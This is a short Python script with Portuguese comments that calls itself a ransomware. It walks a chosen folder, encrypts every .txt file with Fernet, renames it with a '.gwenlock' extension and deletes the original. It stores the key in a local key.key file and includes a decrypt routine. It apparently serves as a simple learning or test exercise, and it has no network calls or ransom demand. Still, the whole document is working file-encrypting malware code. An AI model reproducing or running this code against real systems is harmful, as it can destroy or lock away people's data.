import os
from cryptography.fernet import Fernet

# gera a chave e a salva em um arquivo
def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key) 


# carrega a chave de criptografia
def load_key():
    return open("key.key", "rb").read()

# função para criptografar arquivos
def encrypt(filename, key):
    fernet = Fernet(key)
    for root, dirs, files, in os.walk(filename):
        for file in files:
            if file.endswith(".txt"):
                file_data = os.path.join(root, file)
                with open(file_data, "rb") as f: # transforma o arquivo em binário
                    file_content = f.read() # lê o conteúdo do arquivo e armazena em file_content
                    encrypted = fernet.encrypt(file_content) # criptografa o conteúdo em binário do arquivo com a chave
                new_file_name = file_data + ".gwenlock"
                with open(new_file_name, "wb") as f:
                    f.write(encrypted)  # escreve o conteúdo criptografado no arquivo
                    os.remove(file_data)  # remove o arquivo original .txt
                    print(f"O arquivo {file} foi encriptado e renomeado para {new_file_name}.")

# função para descriptografar arquivos
def decrypt(directory, key):
    fernet = Fernet(key)
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".gwenlock"):  
                file_path = os.path.join(root, file)
                with open(file_path, "rb") as f: # transforma o arquivo em binário
                    encrypted_data = f.read() # lê o conteúdo do arquivo e armazena em encrypted_data
                decrypted_data = fernet.decrypt(encrypted_data) # descriptografa o conteúdo em binário do arquivo com a chave
                # remove a extensão ".gwenlock" ao salvar
                original_file_name = file_path.replace(".gwenlock", "")
                with open(original_file_name, "wb") as f:
                    f.write(decrypted_data)  # escreve o conteúdo descriptografado no arquivo
                    os.remove(file_path)  # remove o arquivo .gwenlock
                print(f"Arquivo {file} descriptografado e renomeado para {original_file_name}.")

# função principal para definir o fluxo do ransomware
def main():
    # solicitar o diretório para criptografar/descriptografar
    target_directory = input("Digite o caminho da pasta para criptografar/descriptografar: ")
    
    if not os.path.exists(target_directory):
        print(f"O diretório {target_directory} não existe.")
        return
    if not os.path.exists("key.key"):
        generate_key()
    key = load_key()

    # escolher entre criptografia e descriptografia para teste
    action = input("Escolha a ação: [E]ncrypt ou [D]ecrypt: ").lower()

    if action == 'e':
        encrypt(target_directory, key)
    elif action == 'd':
        decrypt(target_directory, key)
    else:
        print("Ação inválida. Escolha 'E' para criptografar ou 'D' para descriptografar.")

if __name__ == "__main__":
    main()

